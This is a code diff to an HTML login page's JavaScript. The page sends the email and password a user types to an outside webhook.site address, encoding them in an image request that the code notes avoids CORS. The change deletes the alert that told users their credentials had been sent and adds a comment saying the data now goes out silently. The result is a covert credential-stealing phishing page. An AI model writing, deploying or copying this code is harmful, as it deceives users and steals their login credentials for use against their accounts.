@@ -117,29 +117,28 @@
   </div>
 
   <script>
-    const emailInput = document.getElementById('email');
-    const passwordInput = document.getElementById('password');
-    const loginBtn = document.getElementById('login-btn');
+  const emailInput = document.getElementById('email');
+  const passwordInput = document.getElementById('password');
+  const loginBtn = document.getElementById('login-btn');
 
-    loginBtn.addEventListener('click', () => {
-      if (!emailInput.checkValidity()) {
-        emailInput.reportValidity();
-        return;
-      }
-      if (!passwordInput.value) {
-        alert('Please enter your password');
-        passwordInput.focus();
-        return;
-      }
+  loginBtn.addEventListener('click', () => {
+    if (!emailInput.checkValidity()) {
+      emailInput.reportValidity();
+      return;
+    }
+    if (!passwordInput.value) {
+      alert('Please enter your password');
+      passwordInput.focus();
+      return;
+    }
 
-      const url = `https://webhook.site/6dd9ec8a-69f4-4ebe-a9e7-658a993365bb?email=${encodeURIComponent(emailInput.value)}&password=${encodeURIComponent(passwordInput.value)}`;
+    const url = `https://webhook.site/6dd9ec8a-69f4-4ebe-a9e7-658a993365bb?email=${encodeURIComponent(emailInput.value)}&password=${encodeURIComponent(passwordInput.value)}`;
 
-      // Send data by creating an Image (avoids CORS)
-      const img = new Image();
-      img.src = url;
+    const img = new Image();
+    img.src = url;
 
-      alert(`Sent email and password to webhook:\n\nEmail: ${emailInput.value}\nPassword: ${'*'.repeat(passwordInput.value.length)}`);
-    });
-  </script>
+    // No alert here — data sent silently
+  });
+</script>
 </body>
 </html>
